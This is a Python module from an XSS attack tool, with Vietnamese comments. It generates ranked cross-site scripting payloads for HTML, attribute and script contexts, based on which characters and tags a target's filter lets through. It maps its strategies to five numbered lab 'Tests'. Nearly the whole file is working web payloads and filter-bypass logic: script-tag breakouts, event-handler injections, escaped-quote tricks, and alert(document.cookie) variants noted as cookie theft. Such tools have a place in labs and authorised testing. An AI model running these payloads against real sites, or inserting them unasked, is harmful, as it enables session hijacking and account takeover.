"""
payload_generator.py — Generate XSS payloads từ FilterMap.

Mapping test case → strategy:
  Test 1 (html, body+onresize)       → body_onresize_print   : <body onresize=print()>
  Test 2 (html, xss+onfocus)         → xss_onfocus           : <xss id=x onfocus=alert(document.cookie) tabindex=1>
  Test 3 (attribute, angle encoded)  → quoted_mouseover      : "onmouseover="alert(1)
  Test 4 (script, single+backslash)  → script_tag_breakout   : </script><script>alert(1)</script>
  Test 5 (script, backslash doubled) → bs_double_terminate   : \\'-alert(1)//
"""
from __future__ import annotations

from dataclasses import dataclass
from typing import Optional

from filter_prober.filter_prober import Behavior, FilterMap, AUTO_TRIGGER_EVENTS

# Execution expressions — thứ tự theo độ ưu tiên
_EXEC = ["alert(1)", "confirm(1)", "print()", "alert(document.cookie)", "alert`1`"]

def _e(i: int = 0) -> str:
    return _EXEC[min(i, len(_EXEC) - 1)]


@dataclass
class Payload:
    value:    str
    strategy: str
    context:  str
    note:     str = ""


@dataclass
class AttributeMeta:
    attr_name:  str  = ""
    is_quoted:  bool = True
    quote_char: str  = '"'


def _tags_ok(fm: FilterMap) -> bool:
    bad = (Behavior.ENCODED, Behavior.STRIPPED)
    return fm.angle_open not in bad and fm.angle_close not in bad

def _script_ok(fm: FilterMap) -> bool:
    return _tags_ok(fm) and fm.script_tag == Behavior.ALLOWED

def _events_ok(fm: FilterMap) -> bool:
    return _tags_ok(fm) and fm.event_handlers == Behavior.ALLOWED


# ---------------------------------------------------------------------------
# Build payload từ (tag, event) combo
# ---------------------------------------------------------------------------

def _combo_to_payloads(tag: str, event: str) -> list[Payload]:
    payloads: list[Payload] = []
    is_auto  = event in AUTO_TRIGGER_EVENTS
    strategy = f"{tag}_{event}"

    extra = ""
    if event == "onfocus":
        extra = " autofocus tabindex=1"
    elif event == "onerror":
        extra = " src=x"
    elif event == "ontoggle" and tag == "details":
        extra = " open"

    payloads.append(Payload(
        value    = f"<{tag} {event}={_e(0)}{extra}>",
        strategy = strategy,
        context  = "html",
        note     = "auto-triggers" if is_auto else "requires interaction",
    ))

    payloads.append(Payload(
        value    = f"<{tag} {event}={_e(1)}{extra}>",
        strategy = f"{strategy}_confirm",
        context  = "html",
    ))

    if event == "onresize":
        payloads.append(Payload(
            value    = f"<{tag} {event}=print()>",
            strategy = f"{strategy}_print",
            context  = "html",
            note     = "Test 1: print() triggers resize event in iframe",
        ))

    if event in ("onfocus", "ontoggle"):
        payloads.append(Payload(
            value    = f'<{tag} id=x {event}={_e(0)}{extra}></{tag}>',
            strategy = f"{strategy}_id",
            context  = "html",
            note     = "trigger via location.hash=#x",
        ))

    if tag in ("xss", "x") and event == "onfocus":
        payloads.append(Payload(
            value    = f"<{tag} id=x onfocus=alert(document.cookie) tabindex=1>",
            strategy = f"{strategy}_cookie",
            context  = "html",
            note     = "Test 2: steal cookie via fragment #x",
        ))

    return payloads


def _prioritize_combos(combos: list[tuple[str, str]]) -> list[tuple[str, str]]:
    TAG_PREF = [
        "body", "svg", "img", "input", "details",
        "xss", "x",
        "script",
    ]

    def sort_key(combo: tuple[str, str]) -> tuple[int, int, str]:
        tag, event = combo
        auto_score = 0 if event in AUTO_TRIGGER_EVENTS else 1
        tag_score  = TAG_PREF.index(tag) if tag in TAG_PREF else 99
        return (auto_score, tag_score, event)

    return sorted(combos, key=sort_key)


# ---------------------------------------------------------------------------
# HTML context payloads
# ---------------------------------------------------------------------------

def _html_payloads(fm: FilterMap, **_) -> list[Payload]:
    if not _tags_ok(fm):
        return []

    out: list[Payload] = []

    if _script_ok(fm):
        out += [
            Payload(f"<script>{_e(0)}</script>",  "script_tag",     "html"),
            Payload(f"<SCRIPT>{_e(0)}</SCRIPT>",  "script_case",    "html"),
            Payload(f"<script>{_e(1)}</script>",   "script_confirm", "html"),
        ]

    if fm.allowed_combos:
        for tag, event in _prioritize_combos(fm.allowed_combos):
            out.extend(_combo_to_payloads(tag, event))

    else:
        if _events_ok(fm):
            out += [
                Payload(f"<img src=x onerror={_e(0)}>",       "img_onerror",     "html"),
                Payload(f"<svg onload={_e(0)}>",              "svg_onload",      "html"),
                Payload(f"<input autofocus onfocus={_e(0)}>", "input_autofocus", "html"),
                Payload(f"<details open ontoggle={_e(0)}>",   "details_toggle",  "html"),
            ]

        if fm.custom_tag_events == Behavior.ALLOWED:
            out += [
                Payload(f"<xss id=x onfocus={_e(0)} autofocus tabindex=1>",
                        "custom_autofocus", "html", "custom tag — Test 2 pattern"),
                Payload(f"<xss id=x onfocus=alert(document.cookie) tabindex=1>",
                        "custom_cookie", "html", "Test 2: fragment #x"),
            ]

        if fm.body_events == Behavior.ALLOWED:
            out += [
                Payload("<body onresize=print()>",
                        "body_onresize_print", "html", "Test 1: print() triggers resize"),
                Payload(f"<body onresize={_e(0)}>",  "body_onresize",   "html"),
                Payload(f"<body onpageshow={_e(0)}>", "body_onpageshow", "html"),
            ]

        if fm.input_events == Behavior.ALLOWED:
            out += [
                Payload(f"<input onmouseover={_e(0)}>",       "input_mouseover",  "html"),
                Payload(f"<input autofocus onfocus={_e(0)}>", "input_autofocus2", "html"),
            ]

    no_events = (
        not fm.allowed_combos
        and not _events_ok(fm)
        and fm.custom_tag_events != Behavior.ALLOWED
        and fm.body_events       != Behavior.ALLOWED
        and fm.input_events      != Behavior.ALLOWED
    )
    if no_events:
        out += [
            Payload("&#60;img src=x onerror=alert(1)&#62;",
                    "html_encoded_img", "html", "HTML entity encoded"),
            Payload("<a href='javascript:alert(1)'>click</a>",
                    "anchor_js_uri", "html"),
            Payload("<iframe srcdoc='&#60;img src=x onerror=alert(1)&#62;'>",
                    "srcdoc_encoded", "html", "srcdoc bypasses outer filter"),
        ]

    return out


# ---------------------------------------------------------------------------
# Attribute context payloads — Test 3
# ---------------------------------------------------------------------------

def _attribute_payloads(fm: FilterMap, meta: AttributeMeta, **_) -> list[Payload]:
    out   = []
    qchar = meta.quote_char

    dq_free = fm.double_quote == Behavior.ALLOWED
    sq_free = fm.single_quote == Behavior.ALLOWED

    breakout: Optional[str] = None
    if qchar == '"' and dq_free:    breakout = '"'
    elif qchar == "'" and sq_free:  breakout = "'"
    elif dq_free:                   breakout = '"'
    elif sq_free:                   breakout = "'"

    if breakout:
        bq = breakout

        if fm.event_handlers == Behavior.ALLOWED:
            out += [
                Payload(f'{bq}onmouseover={bq}alert(1)',
                        "quoted_mouseover", "attribute",
                        "Test 3: breakout + onmouseover"),
                Payload(f'{bq} onmouseover="alert(1)',
                        "quoted_mouseover_space", "attribute",
                        "Test 3: space variant"),
                Payload(f'{bq} onfocus={_e(0)} autofocus {bq}',
                        "quoted_autofocus", "attribute"),
                Payload(f'{bq} onpointerover={_e(0)} x={bq}',
                        "quoted_pointer", "attribute"),
            ]

        if _tags_ok(fm):
            if _script_ok(fm):
                out.append(Payload(f'{bq}><script>{_e(0)}</script>',
                                   "quoted_script_breakout", "attribute"))
            if _events_ok(fm):
                out += [
                    Payload(f'{bq}><img src=x onerror={_e(0)}>', "quoted_img", "attribute"),
                    Payload(f'{bq}><svg onload={_e(0)}>',        "quoted_svg", "attribute"),
                ]
            out += [
                Payload(f'{bq}><a href=javascript:{_e(0)}>x</a>',
                        "quoted_anchor_js", "attribute"),
            ]

            if fm.allowed_combos:
                for tag, event in _prioritize_combos(fm.allowed_combos):
                    for cp in _combo_to_payloads(tag, event):
                        out.append(Payload(
                            value    = f'{bq}>{cp.value}',
                            strategy = "attr_breakout_" + cp.strategy,
                            context  = "attribute",
                            note     = cp.note,
                        ))

    if not meta.is_quoted or breakout is None:
        if fm.event_handlers == Behavior.ALLOWED:
            out += [
                Payload(f"onmouseover={_e(0)}",       "unquoted_mouseover",   "attribute"),
                Payload(f" onmouseover={_e(0)} x=",   "unquoted_mouseover2",  "attribute"),
                Payload(f" onfocus={_e(0)} autofocus", "unquoted_autofocus",  "attribute"),
            ]

    return out


# ---------------------------------------------------------------------------
# JS / script context payloads — Test 4 & Test 5
# ---------------------------------------------------------------------------

def _js_payloads(fm: FilterMap, js_quote_char: str = "", **_) -> list[Payload]:
    sq_free    = fm.single_quote == Behavior.ALLOWED
    dq_free    = fm.double_quote == Behavior.ALLOWED
    bt_free    = fm.backtick     == Behavior.ALLOWED
    sq_escaped = fm.single_quote == Behavior.ESCAPED
    bs_doubled = fm.backslash    == Behavior.DOUBLED

    raw_js, sq_pay, dq_pay, bs_pay, bt_pay, tag_pay = [], [], [], [], [], []

    if js_quote_char == "" and sq_free and dq_free:
        raw_js += [
            Payload(_e(0), "raw_js_direct", "script", "marker in raw JS"),
            Payload(_e(2), "raw_js_print",  "script"),
        ]

    if sq_free:
        sq_pay += [
            Payload(f"'-{_e(0)}-'",   "sq_arithmetic", "script"),
            Payload(f"';{_e(0)}//",   "sq_terminate",  "script"),
            Payload(f"';{_e(1)}//",   "sq_confirm",    "script"),
            Payload(f"'||{_e(0)}||'", "sq_or",         "script"),
        ]

    if dq_free and not sq_free:
        dq_pay += [
            Payload(f'"-{_e(0)}-"',   "dq_arithmetic", "script"),
            Payload(f'";{_e(0)}//',   "dq_terminate",  "script"),
            Payload(f'"||{_e(0)}||"', "dq_or",         "script"),
        ]

    if sq_escaped:
        bs_pay += [
            Payload(f"\\'-alert(1)//",               "bs_sq_alert",        "script",
                    r"Test 5: \\'-alert(1)// — exact lab sample"),
            Payload(f"\\'-confirm(1)//",             "bs_sq_confirm",      "script",
                    r"Test 5: confirm() — less likely suppressed"),
            Payload(f"\\'-print()//",                "bs_sq_print",        "script",
                    r"Test 5: print() variant"),
            Payload(f"\\'-alert(document.cookie)//", "bs_sq_cookie",       "script",
                    "Test 5: steal cookie"),
            Payload(f"\\';alert(1)//",               "bs_sq_semi_alert",   "script",
                    r"Test 5: semicolon separator variant"),
            Payload(f"\\';confirm(1)//",             "bs_sq_semi_confirm", "script",
                    r"Test 5: semicolon + confirm"),
        ]

    if bt_free:
        bt_pay += [
            Payload(f"`-{_e(0)}-`",  "bt_arithmetic", "script"),
            Payload(f"`;{_e(0)}//",  "bt_terminate",  "script"),
            Payload(f"${{{_e(0)}}}", "template_expr",  "script"),
        ]

    all_quotes_blocked = not sq_free and not dq_free and not bt_free and not bs_doubled
    if _tags_ok(fm) and (all_quotes_blocked or True):
        if _script_ok(fm):
            tag_pay.append(Payload(
                f"</script><script>{_e(0)}</script>",
                "script_tag_breakout", "script",
                "Test 4: close current script tag, open new one",
            ))
            tag_pay.append(Payload(
                f"</script><script>{_e(1)}</script>",
                "script_tag_breakout_confirm", "script",
            ))
        if _events_ok(fm):
            tag_pay += [
                Payload(f"</script><img src=x onerror={_e(0)}>",
                        "script_img_breakout", "script"),
                Payload(f"</script><svg onload={_e(0)}>",
                        "script_svg_breakout", "script"),
            ]

    if js_quote_char == "'":
        return sq_pay + bs_pay + raw_js + dq_pay + bt_pay + tag_pay
    elif js_quote_char == '"':
        return dq_pay + raw_js + sq_pay + bs_pay + bt_pay + tag_pay
    elif js_quote_char == "`":
        return bt_pay + raw_js + sq_pay + dq_pay + bs_pay + tag_pay
    else:
        return raw_js + sq_pay + dq_pay + bs_pay + bt_pay + tag_pay


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

# "js" là alias của "script" — giữ để tương thích nếu có caller dùng "js"
_GENERATORS = {
    "html":      _html_payloads,
    "attribute": _attribute_payloads,
    "script":    _js_payloads,
    "js":        _js_payloads,   # alias, không xuất hiện từ detector nữa
}


def generate_payloads(
    context:       str,
    filter_map:    FilterMap,
    attr_meta:     Optional[AttributeMeta] = None,
    js_quote_char: str = "",
) -> list[Payload]:
    fn = _GENERATORS.get(context)
    if fn is None:
        return []
    if context == "attribute" and attr_meta is None:
        attr_meta = AttributeMeta()
    raw = fn(fm=filter_map, meta=attr_meta, js_quote_char=js_quote_char)
    seen, unique = set(), []
    for p in raw:
        if p.value not in seen:
            seen.add(p.value)
            unique.append(p)
    return unique


def best_payload(
    context:       str,
    filter_map:    FilterMap,
    attr_meta:     Optional[AttributeMeta] = None,
    js_quote_char: str = "",
) -> Optional[Payload]:
    r = generate_payloads(context, filter_map, attr_meta, js_quote_char)
    return r[0] if r else None
